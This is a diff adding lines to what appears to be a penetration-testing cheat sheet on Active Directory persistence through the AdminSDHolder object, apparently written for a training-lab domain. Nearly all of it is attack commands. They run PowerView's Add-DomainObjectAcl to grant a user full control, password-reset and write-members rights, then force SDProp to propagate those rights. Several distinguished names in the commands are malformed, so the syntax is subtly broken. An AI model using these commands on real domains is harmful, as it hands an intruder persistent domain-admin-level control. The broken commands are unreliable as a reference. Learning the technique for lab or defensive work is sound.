@@ -64,7 +64,14 @@ C:> . .\Invoke-SDPropagator.ps1
 # Force `sdprop` to run
 C:> Invoke-SDPropagator
 
+# Add Full Control Permissions for a user to AdminSDHolder using PowerView
+C:> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc moneycorp,dc=local' -PrincipalIdentity <username> -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 
+# Add Change PAssword permissions
+C:> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity <username> -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+
+# Add Write Members
+C:> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity <username> -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
 ### MORE
